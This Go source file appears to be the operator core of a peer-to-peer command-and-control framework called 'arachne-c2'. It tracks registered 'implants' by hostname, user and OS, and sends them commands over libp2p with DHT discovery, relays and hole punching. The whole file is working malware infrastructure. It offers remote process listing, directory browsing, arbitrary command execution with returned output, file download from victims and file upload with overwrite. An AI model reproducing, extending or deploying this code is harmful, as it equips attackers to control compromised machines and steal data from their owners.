package core

import (
	"context"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
	"google.golang.org/protobuf/proto"

	arachnepb "github.com/portbuster1337/arachne-c2/protobuf/arachnepb"
	"github.com/portbuster1337/arachne-c2/pkg/cryptography"
	"github.com/portbuster1337/arachne-c2/pkg/transport"
)

type ImplantRecord struct {
	Name        string
	Hostname    string
	UUID        string
	Username    string
	UID         string
	GID         string
	OS          string
	Arch        string
	PID         int32
	PeerID      string
	Version     string
	ActiveC2    string
	Locale      string
	LastCheckin time.Time
	Interval    time.Duration
	Jitter      time.Duration
	PublicKey   crypto.PubKey
}

type Operator struct {
	keys     *cryptography.OperatorKey
	node     *transport.Node
	messenger *transport.Messenger
	implants map[string]*ImplantRecord
	mu       sync.RWMutex
	ctx      context.Context
	cancel   context.CancelFunc
}

func NewOperator(ctx context.Context, keys *cryptography.OperatorKey, relayAddrs []string) (*Operator, error) {
	ctx, cancel := context.WithCancel(ctx)

	nodeCfg := transport.NodeConfig{
		ListenAddr:     "/ip4/0.0.0.0/tcp/0",
		BootstrapPeers: transport.DefaultBootstrapAddrs(),
		EnableRelay:    true,
		EnableMDNS:     true,
		EnableDHT:      true,
		RelayAddrs:     relayAddrs,
		PrivateKey:     keys.PrivateKey,
	}

	node, err := transport.NewNode(ctx, nodeCfg,
		libp2p.NoTransports,
		libp2p.Transport(tcp.NewTCPTransport),
		libp2p.EnableHolePunching(),
	)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("create node: %w", err)
	}

	o := &Operator{
		keys:     keys,
		node:     node,
		implants: make(map[string]*ImplantRecord),
		ctx:      ctx,
		cancel:   cancel,
	}

	o.messenger = transport.NewOperatorMessenger(ctx, node, keys)
	o.messenger.SetOperatorID(keys.PeerID)
	o.messenger.SetHandler(o.handleMessage)

	return o, nil
}

func (o *Operator) Start() error {
	log.Printf("[operator] PeerID: %s", o.node.ID().String())
	log.Printf("[operator] Command topic: %s", o.messenger.CommandTopic())
	log.Printf("[operator] Beacon topic: %s", o.messenger.BeaconTopic())

	if err := o.node.StartDiscovery(); err != nil {
		return fmt.Errorf("discovery: %w", err)
	}

		ns := o.messenger.RendezvousString()
		if o.node.DHT != nil {
			go func() {
				for o.node.DHT.RoutingTable().Size() == 0 {
					select {
					case <-o.ctx.Done():
						return
					case <-time.After(2 * time.Second):
					}
				}
				for o.node.Advertise(o.ctx, ns) != nil {
					select {
					case <-o.ctx.Done():
						return
					case <-time.After(10 * time.Second):
					}
				}
				for {
					o.node.Advertise(o.ctx, ns)
					select {
					case <-o.ctx.Done():
						return
					case <-time.After(30 * time.Second):
					}
				}
			}()

		go o.discoverPeersLoop(ns)
	}

	if err := o.messenger.ListenBeacons(o.ctx); err != nil {
		return fmt.Errorf("listen beacons: %w", err)
	}

	return nil
}

func (o *Operator) discoverPeersLoop(ns string) {
	for {
		peerCh, err := o.node.FindPeers(o.ctx, ns)
		if err != nil {
			log.Printf("[operator] DHT find peers: %v", err)
			select {
			case <-o.ctx.Done():
				return
			case <-time.After(30 * time.Second):
			}
			continue
		}

		for pi := range peerCh {
			if pi.ID == o.node.ID() || len(pi.Addrs) == 0 {
				continue
			}
			log.Printf("[operator] discovered peer %s via DHT", pi.ID.String())
		}

		select {
		case <-o.ctx.Done():
			return
		case <-time.After(60 * time.Second):
		}
	}
}

func (o *Operator) handleMessage(ctx context.Context, env *arachnepb.Envelope, senderPub crypto.PubKey) {
	switch env.Type {
	case transport.MsgTypeRegister:
		o.handleBeaconRegister(env)
	case transport.MsgTypePs:
		o.handlePsResult(env)
	case transport.MsgTypeLs:
		o.handleLsResult(env)
	case transport.MsgTypeExecute:
		o.handleExecuteResult(env)
	default:
		if senderPub != nil {
			log.Printf("[operator] received message type=%d", env.Type)
		} else {
			log.Printf("[operator] received message type=%d", env.Type)
		}
	}
}

func (o *Operator) handleBeaconRegister(env *arachnepb.Envelope) {
	beaconReg := &arachnepb.BeaconRegister{}
	if err := proto.Unmarshal(env.Data, beaconReg); err != nil {
		log.Printf("[operator] unmarshal beacon register: %v", err)
		return
	}

	reg := beaconReg.Register
	if reg == nil {
		log.Printf("[operator] beacon register missing Register field")
		return
	}

	pubKey, err := transport.PubKeyFromEnvelope(env)
	if err != nil {
		log.Printf("[operator] get sender key from envelope: %v", err)
		return
	}

	if err := transport.VerifyEnvelope(env, pubKey); err != nil {
		log.Printf("[operator] dropped beacon — invalid signature: %v", err)
		return
	}

	peerID := o.senderPeerID(reg)

	rec := &ImplantRecord{
		Name:        reg.Name,
		Hostname:    reg.Hostname,
		UUID:        reg.UUID,
		Username:    reg.Username,
		UID:         reg.UID,
		GID:         reg.GID,
		OS:          reg.OS,
		Arch:        reg.Arch,
		PID:         reg.PID,
		PeerID:      peerID,
		Version:     reg.Version,
		ActiveC2:    reg.ActiveC2,
		Locale:      reg.Locale,
		LastCheckin: time.Now(),
		Interval:    time.Duration(beaconReg.Interval) * time.Second,
		Jitter:      time.Duration(beaconReg.Jitter) * time.Second,
		PublicKey:   pubKey,
	}

	o.mu.Lock()
	if existing, ok := o.implants[peerID]; ok {
		existing.LastCheckin = time.Now()
		existing.Hostname = reg.Hostname
		existing.Username = reg.Username
		existing.OS = reg.OS
		existing.Arch = reg.Arch
		log.Printf("[operator] beacon update from %s@%s (%s)", reg.Name, reg.Hostname, peerID)
	} else {
		o.implants[peerID] = rec
		log.Printf("[operator] new implant registered: %s@%s [%s/%s] peer=%s",
			reg.Name, reg.Hostname, reg.OS, reg.Arch, peerID)
	}
	o.mu.Unlock()

	o.messenger.AddKnownImplant(peerID, pubKey)
}

func (o *Operator) senderPeerID(reg *arachnepb.Register) string {
	return reg.ActiveC2
}

func (o *Operator) ListImplants() []*ImplantRecord {
	o.mu.RLock()
	defer o.mu.RUnlock()

	out := make([]*ImplantRecord, 0, len(o.implants))
	for _, rec := range o.implants {
		out = append(out, rec)
	}
	return out
}

func (o *Operator) GetImplant(peerID string) *ImplantRecord {
	o.mu.RLock()
	defer o.mu.RUnlock()
	return o.implants[peerID]
}

func (o *Operator) sendCommandToImplant(implantPeerID string, msgType uint32, msg proto.Message) error {
	rec := o.GetImplant(implantPeerID)
	if rec == nil {
		return fmt.Errorf("implant %s not found", implantPeerID)
	}

	data, err := proto.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	env := o.messenger.CreateEnvelope(msgType, data)
	return o.messenger.SignAndSend(o.ctx, o.messenger.CommandTopic(), env)
}

func (o *Operator) Ps(implantPeerID string) error {
	req := &arachnepb.PsReq{}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePs, req)
}

func (o *Operator) Ping(implantPeerID string) error {
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePing, &arachnepb.Ping{})
}

func (o *Operator) Ls(implantPeerID string, path string) error {
	req := &arachnepb.LsReq{Path: path}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeLs, req)
}

func (o *Operator) Execute(implantPeerID string, cmd string, args []string) error {
	req := &arachnepb.ExecuteReq{
		Path:   cmd,
		Args:   args,
		Output: true,
	}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeExecute, req)
}

func (o *Operator) handlePsResult(env *arachnepb.Envelope) {
	result := &arachnepb.Ps{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal ps result: %v", err)
		return
	}
	log.Printf("[operator] ps result: %d processes", len(result.Processes))
	for _, p := range result.Processes {
		log.Printf("  %d: %s (owner: %s)", p.Pid, p.Name, p.Owner)
	}
}

func (o *Operator) handleLsResult(env *arachnepb.Envelope) {
	result := &arachnepb.Ls{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal ls result: %v", err)
		return
	}
	log.Printf("[operator] ls %s: %d entries", result.Path, len(result.Files))
	for _, f := range result.Files {
		dir := " "
		if f.IsDir {
			dir = "d"
		}
		log.Printf("  %s %s (%d bytes)", dir, f.Name, f.Size)
	}
}

func (o *Operator) handleExecuteResult(env *arachnepb.Envelope) {
	result := &arachnepb.Execute{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal execute result: %v", err)
		return
	}
	log.Printf("[operator] execute result: status=%d stdout=%d bytes stderr=%d bytes",
		result.Status, len(result.Stdout), len(result.Stderr))
	if len(result.Stdout) > 0 {
		fmt.Println(string(result.Stdout))
	}
	if len(result.Stderr) > 0 {
		fmt.Fprintf(os.Stderr, "%s\n", string(result.Stderr))
	}
}

func (o *Operator) Cd(implantPeerID string, path string) error {
	req := &arachnepb.CdReq{Path: path}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeCd, req)
}

func (o *Operator) Pwd(implantPeerID string) error {
	req := &arachnepb.PwdReq{}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePwd, req)
}

func (o *Operator) Download(implantPeerID string, path string) error {
	req := &arachnepb.DownloadReq{Path: path}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeDownload, req)
}

func (o *Operator) Upload(implantPeerID string, path string, data []byte) error {
	req := &arachnepb.UploadReq{
		Path:      path,
		Data:      data,
		Overwrite: true,
	}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeUpload, req)
}

func (o *Operator) Close() error {
	o.cancel()
	return o.node.Close()
}
